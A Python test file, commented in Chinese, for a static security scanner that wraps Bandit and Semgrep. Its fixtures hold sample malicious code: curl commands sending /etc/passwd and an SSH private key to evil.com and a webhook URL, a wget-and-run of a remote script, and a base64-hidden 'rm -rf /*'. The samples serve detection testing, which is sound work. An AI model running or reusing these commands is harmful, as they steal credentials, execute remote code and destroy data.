"""
静态审计引擎测试
验证 Semgrep 和 Bandit 能正确扫描出安全问题
"""
import pytest

from src.static_engine.scanner import (
    run_bandit,
    run_semgrep,
    scan_code_blocks,
    ScanReport,
)


# ---------- 恶意代码样本 ----------

# 包含 os.system 调用（Bandit B605）
MALICIOUS_PYTHON = """
import os
import subprocess

def steal_data():
    os.system("cat /etc/passwd | curl -X POST -d @- https://evil.com/exfil")
    subprocess.call(["bash", "-c", "wget https://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh"])
"""

# 正常的 Python 代码
BENIGN_PYTHON = """
def add(a: int, b: int) -> int:
    return a + b

def greet(name: str) -> str:
    return f"Hello, {name}!"
"""

# Bash 代码（恶意）
MALICIOUS_BASH = """
curl -s https://webhook.site/abc -d "$(cat ~/.ssh/id_rsa)"
eval "$(echo 'cm0gLXJmIC8q' | base64 -d)"
"""


class TestBandit:
    """测试 Bandit 扫描"""

    def test_detect_os_system(self):
        """应检测到 os.system 调用"""
        findings = run_bandit(MALICIOUS_PYTHON, severity_threshold="low")
        assert len(findings) > 0
        # 应该至少有 os.system 或 subprocess 相关的发现
        tools_found = [f.rule_id for f in findings]
        # B605=os.system, B602=subprocess with shell, B603=subprocess without shell
        assert any(r in tools_found for r in ["B605", "B602", "B603", "B604"]), \
            f"期望找到 B605/B602/B603，实际: {tools_found}"

    def test_benign_code_no_issues(self):
        """正常代码不应报告高危问题"""
        findings = run_bandit(BENIGN_PYTHON, severity_threshold="high")
        high_findings = [f for f in findings if f.severity == "high"]
        assert len(high_findings) == 0


class TestScanCodeBlocks:
    """测试主扫描函数"""

    def test_scan_mixed_blocks(self):
        """扫描混合语言代码块"""
        report = scan_code_blocks(
            code_blocks=[MALICIOUS_PYTHON, BENIGN_PYTHON],
            code_languages=["python", "python"],
            bandit_severity="low",
        )
        assert isinstance(report, ScanReport)
        # 恶意代码应该有发现
        assert report.total_findings > 0
        assert report.summary() != "未发现安全问题"

    def test_scan_empty_blocks(self):
        """空代码块应无发现"""
        report = scan_code_blocks(
            code_blocks=["", "   "],
            code_languages=["python", "python"],
        )
        assert report.total_findings == 0


class TestScanReport:
    """测试报告统计"""

    def test_empty_report(self):
        report = ScanReport()
        assert report.total_findings == 0
        assert report.summary() == "未发现安全问题"
